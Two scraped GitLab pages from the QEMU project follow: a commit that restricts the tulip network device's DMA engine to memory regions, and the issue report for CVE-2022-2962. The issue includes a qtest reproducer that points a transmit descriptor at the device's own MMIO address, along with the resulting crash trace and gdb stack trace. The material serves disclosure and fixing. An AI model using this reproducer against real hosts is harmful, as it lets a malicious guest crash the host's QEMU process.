=== Content from gitlab.com_4f386863_20250108_132654.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

**Commit
36a894ae**

authored
Aug 21, 2022
by
**[![Zheyu Ma's avatar](https://secure.gravatar.com/avatar/45ff759a53235e02c0b55e2173820dea9b34259d50e0df9cf047e03b367a5d21?s=96&d=identicon "Zheyu Ma")](/zheyuma97)
[Zheyu Ma](/zheyuma97)**
Committed by
[Jason Wang](/jasowang)
Sep 02, 2022

[Browse files](/qemu-project/qemu/-/tree/36a894aeb64a2e02871016da1c37d4a4ca109182)

### net: tulip: Restrict DMA engine to memories

```

The DMA engine is started by I/O access and then itself accesses the
I/O registers, triggering a reentrancy bug.

The following log can reveal it:
==5637==ERROR: AddressSanitizer: stack-overflow
    #0 0x5595435f6078 in tulip_xmit_list_update qemu/hw/net/tulip.c:673
    #1 0x5595435f204a in tulip_write qemu/hw/net/tulip.c:805:13
    #2 0x559544637f86 in memory_region_write_accessor qemu/softmmu/memory.c:492:5
    #3 0x5595446379fa in access_with_adjusted_size qemu/softmmu/memory.c:554:18
    #4 0x5595446372fa in memory_region_dispatch_write qemu/softmmu/memory.c
    #5 0x55954468b74c in flatview_write_continue qemu/softmmu/physmem.c:2825:23
    #6 0x559544683662 in flatview_write qemu/softmmu/physmem.c:2867:12
    #7 0x5595446833f3 in address_space_write qemu/softmmu/physmem.c:2963:18
    #8 0x5595435fb082 in dma_memory_rw_relaxed qemu/include/sysemu/dma.h:87:12
    #9 0x5595435fb082 in dma_memory_rw qemu/include/sysemu/dma.h:130:12
    #10 0x5595435fb082 in dma_memory_write qemu/include/sysemu/dma.h:171:12
    #11 0x5595435fb082 in stl_le_dma qemu/include/sysemu/dma.h:272:1
    #12 0x5595435fb082 in stl_le_pci_dma qemu/include/hw/pci/pci.h:910:1
    #13 0x5595435fb082 in tulip_desc_write qemu/hw/net/tulip.c:101:9
    #14 0x5595435f7e3d in tulip_xmit_list_update qemu/hw/net/tulip.c:706:9
    #15 0x5595435f204a in tulip_write qemu/hw/net/tulip.c:805:13

Fix this bug by restricting the DMA engine to memories regions.

Signed-off-by: ![default avatar](https://secure.gravatar.com/avatar/45ff759a53235e02c0b55e2173820dea9b34259d50e0df9cf047e03b367a5d21?s=32&d=identicon)Zheyu Ma <zheyuma97@gmail.com>
Signed-off-by: [![Jason Wang's avatar](https://secure.gravatar.com/avatar/84fc00b985b91bfa000fb92ba5dc5e688f6b687fd8c32e18629693e61015eb8d?s=64&d=identicon "Jason Wang")](https://gitlab.com/jasowang "jasowang@redhat.com")[Jason Wang](https://gitlab.com/jasowang "jasowang@redhat.com") <jasowang@redhat.com>
```

parent
[3772cf0d](/qemu-project/qemu/-/commit/3772cf0d1b37d32e61dc314e9cc18ff745327ddd)

Loading

Loading

Loading

* [Changes
  1](/qemu-project/qemu/-/commit/36a894aeb64a2e02871016da1c37d4a4ca109182)

[Hide whitespace changes](/qemu-project/qemu/-/commit/36a894aeb64a2e02871016da1c37d4a4ca109182?action=show&controller=projects%2Fcommit&id=36a894aeb64a2e02871016da1c37d4a4ca109182&namespace_id=qemu-project&project_id=qemu&w=1)
[Inline](/qemu-project/qemu/-/commit/36a894aeb64a2e02871016da1c37d4a4ca109182?view=inline)
[Side-by-side](/qemu-project/qemu/-/commit/36a894aeb64a2e02871016da1c37d4a4ca109182?view=parallel)

Loading

* [Thomas Huth](/thuth)
  @thuth

  mentioned in issue [#1171 (closed)](/qemu-project/qemu/-/issues/1171 "tulip: DMA reentrancy issue leads to stack overflow (CVE-2022-2962)")

  ·

  [Sep 14, 2022](#note_1101128807)

  mentioned in issue [#1171 (closed)](/qemu-project/qemu/-/issues/1171 "tulip: DMA reentrancy issue leads to stack overflow (CVE-2022-2962)")

  mentioned in issue #1171

  Toggle commit list
* [Ghassane Ben El Aattar](/GhassaneBen)
  @GhassaneBen

  mentioned in commit [noi-techpark-premium/solda/mirrors/oniro-goofy@98a3c92f](/noi-techpark-premium/solda/mirrors/oniro-goofy/-/commit/98a3c92f8f701d7943e9be01ef57f41ab5880cce "qemu: backport upstream fix for CVE-2022-2962.")

  ·

  [Oct 28, 2022](#note_1152219064)

  mentioned in commit [noi-techpark-premium/solda/mirrors/oniro-goofy@98a3c92f](/noi-techpark-premium/solda/mirrors/oniro-goofy/-/commit/98a3c92f8f701d7943e9be01ef57f41ab5880cce "qemu: backport upstream fix for CVE-2022-2962.")

  mentioned in commit noi-techpark-premium/solda/mirrors/oniro-goofy@98a3c92f8f701d7943e9be01ef57f41ab5880cce

  Toggle commit list

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from gitlab.com_a72ceeeb_20250108_132654.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# tulip: DMA reentrancy issue leads to stack overflow (CVE-2022-2962)

## Description of problem

A DMA reentrancy issue was found in the tulip emulation. When tulip reads or writes to rx/tx descriptor ( tulip\_desc\_read/write ) or copies rx/tx frame(tulip\_copy\_rx\_bytes / tulip\_copy\_tx\_buffers), it doesn't check whether the destination address is its own MMIO address. A malicious guest could use this flaw to crash the QEMU process on the host, resulting in a denial of service condition or, potentially, executing arbitrary code within the context of the QEMU process on the host.

## Reproducer

```
cat << EOF | ./qemu-system-x86_64 -machine type=q35,accel=qtest \
-nodefaults -device tulip -qtest stdio \

outl 0xcf8 0x80000804             /* PCICMD—PCI Command Register */
outl 0xcfc 0x107                  /* Enables accesses */
outl 0xcf8 0x80000814             /* Memory Bar 1 */
outl 0xcfc 0xfebf1000             /* Set MMIO Address to 0xfebf1000 */
writel 0xfebf1000 0               /* tulip_reset */
writel 0xfebf1030 0x2001          /* set csr6 flags=CSR6_ST|CSR6_SR */
writel 0xfebf1020 0xfebf1008      /* set current_tx_desc to its MMIO address,and trigger tulip_desc_write */
EOF
```

## Trace events

```
[I 1655571308.706424] OPENED
outl 0xcf8 0x80000804
[R +7.839894] outl 0xcf8 0x80000804
OK
[S +7.839916] OK
outl 0xcfc 0x107
[R +10.885790] outl 0xcfc 0x107
OK
[S +10.885947] OK
outl 0xcf8 0x80000814
[R +14.951836] outl 0xcf8 0x80000814
OK
[S +14.951864] OK
outl 0xcfc 0xfebf1000
[R +17.905809] outl 0xcfc 0xfebf1000
OK
[S +17.905969] OK
writel 0xfebf1000 0
[R +21.069936] writel 0xfebf1000 0
OK
[S +21.069966] OK
writel 0xfebf1030 0x2001
[R +23.897858] writel 0xfebf1030 0x2001
OK
[S +23.897897] OK
writel 0xfebf1020 0xfebf1008
[R +26.867841] writel 0xfebf1020 0xfebf1008
Segmentation fault (core dumped)
```

## Stack trace

From gdb:

```
#0  0x000055cb2de15dba in address_space_read_full (as=0x55cb3041ee50, addr=4273934344, attrs=..., buf=0x7ffc7953d0a0, len=4) at ../softmmu/physmem.c:2933
#1  0x000055cb2de15f65 in address_space_rw (as=as@entry=0x55cb3041ee50, addr=<optimized out>, attrs=..., attrs@entry=..., buf=buf@entry=0x7ffc7953d0a0, len=len@entry=4, is_write=is_write@entry=false) at ../softmmu/physmem.c:2964
#2  0x000055cb2dc9e074 in dma_memory_rw_relaxed (attrs=..., dir=DMA_DIRECTION_TO_DEVICE, len=4, buf=0x7ffc7953d0a0, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:130
#3  dma_memory_rw (attrs=..., dir=DMA_DIRECTION_TO_DEVICE, len=4, buf=0x7ffc7953d0a0, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:130
#4  dma_memory_read (attrs=..., len=4, buf=0x7ffc7953d0a0, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:150
#5  ldl_le_dma (attrs=..., pval=0x7ffc7953d0a0, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:272
#6  ldl_le_pci_dma (attrs=..., val=0x7ffc7953d0a0, addr=4273934344, dev=0x55cb3041ec20) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/hw/pci/pci.h:883
#7  tulip_desc_read (s=s@entry=0x55cb3041ec20, p=4273934344, desc=desc@entry=0x7ffc7953d0a0) at ../hw/net/tulip.c:81
#8  0x000055cb2dc9e5fd in tulip_xmit_list_update (s=s@entry=0x55cb3041ec20) at ../hw/net/tulip.c:683
#9  0x000055cb2dc9ec00 in tulip_write (opaque=0x55cb3041ec20, addr=<optimized out>, data=<optimized out>, size=<optimized out>) at ../hw/net/tulip.c:781
#10 0x000055cb2de0ba53 in memory_region_write_accessor (mr=mr@entry=0x55cb3041f730, addr=8, value=value@entry=0x7ffc7953d288, size=size@entry=4, shift=<optimized out>, mask=mask@entry=4294967295, attrs=...) at ../softmmu/memory.c:492
#11 0x000055cb2de07abe in access_with_adjusted_size (addr=addr@entry=8, value=value@entry=0x7ffc7953d288, size=size@entry=4, access_size_min=<optimized out>, access_size_max=<optimized out>, access_fn=0x55cb2de0b9d0 <memory_region_write_accessor>, mr=0x55cb3041f730, attrs=...) at ../softmmu/memory.c:554
#12 0x000055cb2de0b03c in memory_region_dispatch_write (mr=mr@entry=0x55cb3041f730, addr=8, data=<optimized out>, op=<optimized out>, attrs=attrs@entry=...) at ../softmmu/memory.c:1514
#13 0x000055cb2de1212f in flatview_write_continue (fv=fv@entry=0x55cb30518dc0, addr=addr@entry=4273934344, attrs=..., ptr=ptr@entry=0x7ffc7953d434, len=len@entry=4, addr1=<optimized out>, l=<optimized out>, mr=0x55cb3041f730) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/qemu/host-utils.h:165
#14 0x000055cb2de122aa in flatview_write (fv=0x55cb30518dc0, addr=addr@entry=4273934344, attrs=attrs@entry=..., buf=buf@entry=0x7ffc7953d434, len=len@entry=4) at ../softmmu/physmem.c:2856
#15 0x000055cb2de15ee8 in address_space_write (as=as@entry=0x55cb3041ee50, addr=4273934344, attrs=..., buf=buf@entry=0x7ffc7953d434, len=len@entry=4) at ../softmmu/physmem.c:2952
#16 0x000055cb2de15f5e in address_space_rw (as=as@entry=0x55cb3041ee50, addr=<optimized out>, attrs=..., attrs@entry=..., buf=buf@entry=0x7ffc7953d434, len=len@entry=4, is_write=is_write@entry=true) at ../softmmu/physmem.c:2962
#17 0x000055cb2dc9dd70 in dma_memory_rw_relaxed (attrs=..., dir=DMA_DIRECTION_FROM_DEVICE, len=4, buf=0x7ffc7953d434, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:130
#18 dma_memory_rw (attrs=..., dir=DMA_DIRECTION_FROM_DEVICE, len=4, buf=0x7ffc7953d434, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:130
#19 dma_memory_write (attrs=..., len=4, buf=0x7ffc7953d434, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:171
#20 stl_le_dma (attrs=..., val=<optimized out>, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:272
#21 stl_le_pci_dma (attrs=..., val=<optimized out>, addr=4273934344, dev=0x55cb3041ec20) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/hw/pci/pci.h:883
#22 tulip_desc_write (s=s@entry=0x55cb3041ec20, p=4273934344, desc=desc@entry=0x7ffc7953d4b0) at ../hw/net/tulip.c:99
#23 0x000055cb2dc9e6b9 in tulip_xmit_list_update (s=s@entry=0x55cb3041ec20) at ../hw/net/tulip.c:706
#24 0x000055cb2dc9ec00 in tulip_write (opaque=0x55cb3041ec20, addr=<optimized out>, data=<optimized out>, size=<optimized out>) at ../hw/net/tulip.c:781
#25 0x000055cb2de0ba53 in memory_region_write_accessor (mr=mr@entry=0x55cb3041f730, addr=8, value=value@entry=0x7ffc7953d698, size=size@entry=4, shift=<optimized out>, mask=mask@entry=4294967295, attrs=...) at ../softmmu/memory.c:492
#26 0x000055cb2de07abe in access_with_adjusted_size (addr=addr@entry=8, value=value@entry=0x7ffc7953d698, size=size@entry=4, access_size_min=<optimized out>, access_size_max=<optimized out>, access_fn=0x55cb2de0b9d0 <memory_region_write_accessor>, mr=0x55cb3041f730, attrs=...) at ../softmmu/memory.c:554
#27 0x000055cb2de0b03c in memory_region_dispatch_write (mr=mr@entry=0x55cb3041f730, addr=8, data=<optimized out>, op=<optimized out>, attrs=attrs@entry=...) at ../softmmu/memory.c:1514
#28 0x000055cb2de1212f in flatview_write_continue (fv=fv@entry=0x55cb30518dc0, addr=addr@entry=4273934344, attrs=..., ptr=ptr@entry=0x7ffc7953d844, len=len@entry=4, addr1=<optimized out>, l=<optimized out>, mr=0x55cb3041f730) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/qemu/host-utils.h:165
#29 0x000055cb2de122aa in flatview_write (fv=0x55cb30518dc0, addr=addr@entry=4273934344, attrs=attrs@entry=..., buf=buf@entry=0x7ffc7953d844, len=len@entry=4) at ../softmmu/physmem.c:2856
#30 0x000055cb2de15ee8 in address_space_write (as=as@entry=0x55cb3041ee50, addr=4273934344, attrs=..., buf=buf@entry=0x7ffc7953d844, len=len@entry=4) at ../softmmu/physmem.c:2952
#31 0x000055cb2de15f5e in address_space_rw (as=as@entry=0x55cb3041ee50, addr=<optimized out>, attrs=..., attrs@entry=..., buf=buf@entry=0x7ffc7953d844, len=len@entry=4, is_write=is_write@entry=true) at ../softmmu/physmem.c:2962
#32 0x000055cb2dc9dd70 in dma_memory_rw_relaxed (attrs=..., dir=DMA_DIRECTION_FROM_DEVICE, len=4, buf=0x7ffc7953d844, addr=4273934344, as=0x55cb3041ee50) at /home/coc/Desktop/qemu_bug/qemu-7.0.0/include/sysemu/dma.h:130
......
```

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


